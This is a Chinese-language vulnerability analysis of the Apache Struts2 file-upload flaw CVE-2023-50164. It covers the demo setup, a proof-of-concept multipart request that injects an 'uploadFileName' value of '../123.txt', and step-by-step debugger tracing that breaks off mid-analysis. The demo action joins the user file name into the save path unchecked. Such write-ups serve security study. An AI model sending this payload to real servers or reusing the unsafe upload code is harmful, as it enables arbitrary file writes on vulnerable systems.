# Apache Struts2 文件上传分析(CVE-2023-50164/S2-066)

# 影响版本

- Struts 2.5.0-Struts 2.5.32
- Struts 6.0.0-Struts 6.3.0

# 环境搭建

新建Jakarta EE 项目

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled.png)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%201.png)

添加 struct2 依赖

```xml
<dependency>
      <groupId>org.apache.struts</groupId>
      <artifactId>struts2-core</artifactId>
      <version>6.3.0</version>
</dependency>
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%202.png)

定义一个 `UploadAction`

```java
package com.example.apachestrutsdemo;

import com.opensymphony.xwork2.ActionSupport;
import org.apache.commons.io.FileUtils;
import org.apache.struts2.ServletActionContext;

import java.io.*;

public class UploadAction extends ActionSupport {

    private static final long serialVersionUID = 1L;

    private File upload;

    // 文件类型，为name属性值 + ContentType
    private String uploadContentType;

    // 文件名称，为name属性值 + FileName
    private String uploadFileName;

    public File getUpload() {
        return upload;
    }

    public void setUpload(File upload) {
        this.upload = upload;
    }

    public String getUploadContentType() {
        return uploadContentType;
    }

    public void setUploadContentType(String uploadContentType) {
        this.uploadContentType = uploadContentType;
    }

    public String getUploadFileName() {
        return uploadFileName;
    }

    public void setUploadFileName(String uploadFileName) {
        this.uploadFileName = uploadFileName;
    }

    public String doUpload() {
        String path = ServletActionContext.getServletContext().getRealPath("/")+"upload";
        String realPath = path + File.separator +uploadFileName;
        try {
            FileUtils.copyFile(upload, new File(realPath));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return SUCCESS;
    }

}
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%203.png)

在 struts.xml 当中，通常默认配置下这个文件在项目路径的 /WEB-INF/classes 路径下

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>
    <package name="upload" extends="struts-default">
        <action name="upload" class="com.example.apachestrutsdemo.UploadAction" method="doUpload">
            <result name="success" type="">/index.jsp</result>
        </action>
    </package>
</struts>
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%204.png)

注意 action 要修改为本项目 `UploadAction` 的路径

在 web.xml 当中配置好 `filter`

```xml
<filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>*.action</url-pattern>
</filter-mapping>
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%205.png)

启动tomcat

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%206.png)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%207.png)

测试一下文件上传, 请求包如下

```
POST /apachestrutsdemo_war_exploded/upload.action HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

在 `src/test/resources`  目录下,右键新建 `HTTP` 请求, 注意修改成本地的 URL 路径, HOST 中注意端口号

点击发送

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%208.png)

成功上传文件, 在 target/ApacheStrutsdemo-1.0-SNAPSHOT/ 目录下会创建一个 upload 目录

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%209.png)

# 漏洞分析

## Part 1

struts2 有自己的上传过滤器, 过滤的配置在 `struts-default.xml` 中

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2010.png)

重点看 `org.apache.struts2.interceptor.FileUploadInterceptor#intercept`

(Why? `FileUploadInterceptor`实现了一个抽象类,抽象类中定义了叫`intercept`的抽象方法,`FileUploadInterceptor`必须实现该方法,所以重点看`FileUploadInterceptor#intercept`即可)

```java
public String intercept(ActionInvocation invocation) throws Exception {
        ActionContext ac = invocation.getInvocationContext();
        HttpServletRequest request = ac.getServletRequest();
        if (!(request instanceof MultiPartRequestWrapper)) {
            if (LOG.isDebugEnabled()) {
                ActionProxy proxy = invocation.getProxy();
                LOG.debug(this.getTextMessage("struts.messages.bypass.request", new String[]{proxy.getNamespace(), proxy.getActionName()}));
            }

            return invocation.invoke();
        } else {
            ValidationAware validation = null;
            Object action = invocation.getAction();
            if (action instanceof ValidationAware) {
                validation = (ValidationAware)action;
            }

            MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper)request;
            if (multiWrapper.hasErrors() && validation != null) {
                TextProvider textProvider = this.getTextProvider(action);

                String errorMessage;
                for(Iterator var8 = multiWrapper.getErrors().iterator(); var8.hasNext(); validation.addActionError(errorMessage)) {
                    LocalizedMessage error = (LocalizedMessage)var8.next();
                    if (textProvider.hasKey(error.getTextKey())) {
                        errorMessage = textProvider.getText(error.getTextKey(), Arrays.asList(error.getArgs()));
                    } else {
                        errorMessage = textProvider.getText("struts.messages.error.uploading", error.getDefaultMessage());
                    }
                }
            }

            Enumeration fileParameterNames = multiWrapper.getFileParameterNames();

            while(fileParameterNames != null && fileParameterNames.hasMoreElements()) {
                String inputName = (String)fileParameterNames.nextElement();
                String[] contentType = multiWrapper.getContentTypes(inputName);
                if (!this.isNonEmpty(contentType)) {
                    if (LOG.isWarnEnabled()) {
                        LOG.warn(this.getTextMessage(action, "struts.messages.invalid.content.type", new String[]{inputName}));
                    }
                } else {
                    String[] fileName = multiWrapper.getFileNames(inputName);
                    if (!this.isNonEmpty(fileName)) {
                        if (LOG.isWarnEnabled()) {
                            LOG.warn(this.getTextMessage(action, "struts.messages.invalid.file", new String[]{inputName}));
                        }
                    } else {
                        UploadedFile[] files = multiWrapper.getFiles(inputName);
                        if (files != null && files.length > 0) {
                            List<UploadedFile> acceptedFiles = new ArrayList(files.length);
                            List<String> acceptedContentTypes = new ArrayList(files.length);
                            List<String> acceptedFileNames = new ArrayList(files.length);
                            String contentTypeName = inputName + "ContentType";
                            String fileNameName = inputName + "FileName";

                            for(int index = 0; index < files.length; ++index) {
                                if (this.acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) {
                                    acceptedFiles.add(files[index]);
                                    acceptedContentTypes.add(contentType[index]);
                                    acceptedFileNames.add(fileName[index]);
                                }
                            }

                            if (!acceptedFiles.isEmpty()) {
                                Map<String, Parameter> newParams = new HashMap();
                                newParams.put(inputName, new Parameter.File(inputName, acceptedFiles.toArray(new UploadedFile[acceptedFiles.size()])));
                                newParams.put(contentTypeName, new Parameter.File(contentTypeName, acceptedContentTypes.toArray(new String[acceptedContentTypes.size()])));
                                newParams.put(fileNameName, new Parameter.File(fileNameName, acceptedFileNames.toArray(new String[acceptedFileNames.size()])));
                                ac.getParameters().appendAll(newParams);
                            }
                        }
                    }
                }
            }

            return invocation.invoke();
        }
    }
```

上传之前的测试包,来理解一下其中的逻辑

很容易可以看到, 获取上传文件的文件名通过 `multiWrapper.getFileNames` 做处理

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2011.png)

步入

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2012.png)

```
FileUploadInterceptor#intercept
	->MultiPartRequestWrapper#getFileNames
```

发现传入参数 `fileName` 是 `Upload`, 即 `inputName` 为 `Upload`

<aside>
💡 `inputName` 就是请求中的 `name`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2013.png)

关于 `inputName` 如何获取的不再多做说明,记住他就是 `name` 即可

</aside>

经过一个三元运算, 继续跟进 `JakartaMultiPartRequest#getFileNames`

```
FileUploadInterceptor#intercept
	->MultiPartRequestWrapper#getFileNames
		->JakartaMultiPartRequest#getFileNames
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2014.png)

其中首先, 通过 `Upload` 定位到对应上传文件名即 `../1.txt`

 `JakartaMultiPartRequest#getCanonicalName` 对传入文件名进行处理, 步入

```
FileUploadInterceptor#intercept
	->MultiPartRequestWrapper#getFileNames
		->JakartaMultiPartRequest#getFileNames
			->JakartaMultiPartRequest#getCanonicalName
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2015.png)

很明显地对 `/` 和 `\` 进行了过滤

`String#lastIndexOf` 会找到最后出现的 index, `String#substring` 进行截取, 最后得到合法的文件名

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2016.png)

对文件名的处理到此完成

回到 `org.apache.struts2.interceptor.FileUploadInterceptor#intercept`

处理完文件名后，会把一些信息保存到 `acceptedFiles` / `acceptedContentTypes` / `acceptedFileNames` 中

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2017.png)

- `acceptedFiles` 是所上传文件的临时文件(其实就是文件内容吧应该可以这么理解)
- `acceptedContentTypes` 为上传文件的文件类型
- `acceptedFileNames` 就是上传文件名

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2018.png)

接着实现了一个 `HashMap` 型 `newParams`, (***此处伏笔***) 将信息存入,分别成为

- `Upload`
- `UploadContentType`
- `UploadFileName`
    
    ![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2019.png)
    

<aside>
💡 后面会通过反射分别调用上面参数在我们定义的 UploadAction 中的 `setter` 方法, 为其三个参数赋值

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2020.png)

</aside>

走到 `ac.getParameters().appendAll(newParams);`, `appendAll(newParams)`是一个添加操作

这里的 ac 是我们上下文的 Context，而 `ac.getParameters()` 获取到的则是 `org.apache.struts2.ActionContext.parameters`，一个 `HttpParameters` 类，这里将上传文件的信息都放在了 `HttpParameters` 中

执行后,可以看到上传信息就被添加到了 action 这个上下文类的参数里

![Screenshot_20231220_171927.png](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Screenshot_20231220_171927.png)

<aside>
💡 注意 `newParams` 被存入 ac 上下文中, 其保存结构和性质还是为 `HashMap`

</aside>

## Part 2

根据漏洞描述, 是因为大小写进行变量覆盖导致得污染相关上传参数致使目录穿越

现在构造一个能够造成漏洞的数据包, 来测试一下变量覆盖是不是在此处文件上传拦截器触发的

```
POST /apachestrutsdemo_war_exploded/upload.action HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
Content-Disposition: form-data; name="uploadFileName"

../123.txt
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

发送后, 发现造成了目录穿越

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2021.png)

把断点下到这里

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2022.png)

重新发包看 ac

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2023.png)

发现能够造成目录穿越的文件名被存储到了 ac 中,而 1.txt 正常的文件名没有被覆盖掉

所以可以得出 变量覆盖 不是发生在文件上传过滤器中, 而是在其之后

<aside>
💡 根据本人调试, 在执行 `FileUploadInterceptor#intercept` 前, ac 中就已经有 `uploadFileName` 了, 而不是在执行过程中才存入的, 应该是他没有被识别成文件信息的一部分, 所以不进入 `FileUploadInterceptor` 处理, 也就是说在 `FileUploadInterceptor#intercept` 中对文件名称防止路径穿越的处理即 `JakartaMultiPartRequest#getCanonicalName` 对他没用, 但是具体什么时候我没有找到

</aside>

将程序运行到 `UploadAction#doUpload`, 此时 `uploadFileName` 已经变为了造成目录穿越的文件名

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2024.png)

**问题就出现在用反射将 ac 中信息填充到 `UploadAction` 三个参数的过程中**

## Part 3

### Part 3.1

接下来我们找反射的调用过程, 在 `setter` 位置进行断点调试，发送一个请求包

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2025.png)

在调用堆栈中, 找到执行了 `ParametersInterceptor#setParameters`, 顾名思义

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2026.png)

可以看到做了一个 `while` 循环, 再看一下传入该函数的参数 `parameters`, 这里就是循环调用反射赋值的地方

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2027.png)

`ParametersInterceptor` 就是 struts 的一个拦截器, 这就是要找的地方

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2028.png)

其实现的父类抽象方法为 `doIntercept`, 也是在该方法中调用的 `ParametersInterceptor#setParameters`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2029.png)

直接来看 `ParametersInterceptor#setParameters`, 在开头下好断点

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2030.png)

将 `parameters` 传给了一个新的变量 `params`, 并声明了 一个 `**TreeMap` 类型的 `acceptableParameters`** (**伏笔二**)

接下来制作了一个 `params` 的迭代器, `isAcceptableParameter` 对 `params` 中各个进行是否为可接受参数的判断, 判断这块没啥好说的

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2031.png)

最后也是全部加入 `acceptableParameters`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2032.png)

<aside>
💡 注意看最终 `acceptableParameters` 中对应的顺序 (**伏笔三**), 这是 `TreeMap` 结构的特性导致的, 始终按照首个字母的 Ascii 码大小对 `Map` 进行排序, 不管你以何种顺序存入的, 如下

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2033.png)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2034.png)

可以看到不管是存入后的顺序还是遍历顺序

</aside>

将程序运行到这里

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2035.png)

进行迭代了, 目前迭代的是第一个 `Upload`

从前面在 `setter` 下断点时的调用栈就知道这里逐步往下调用的, 步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2036.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2037.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2038.png)

这里就可以看到把 `UploadAction` 类加入了, 后面获取类方法

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2039.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2040.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
不用看这三个,运行到 Ognl.setValue 处步入
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2041.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2042.png)

(判断,直接步过进入else即可)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2043.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2044.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2045.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2046.png)

可以看到在属性赋值即 `OgnlRuntime#setProperty` 前, 先进行了能不能对该属性赋值的判断

### Part 3.2

运行到 `OgnlRuntime.*hasSetProperty*(ognlContext, o, name)` 处, 步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2047.png)

对该属性有无 `setter` 方法判断
步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2048.png)

执行了一个函数, 方法时候可用, 其中首先获得函数

步入 `getSetMethod`

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
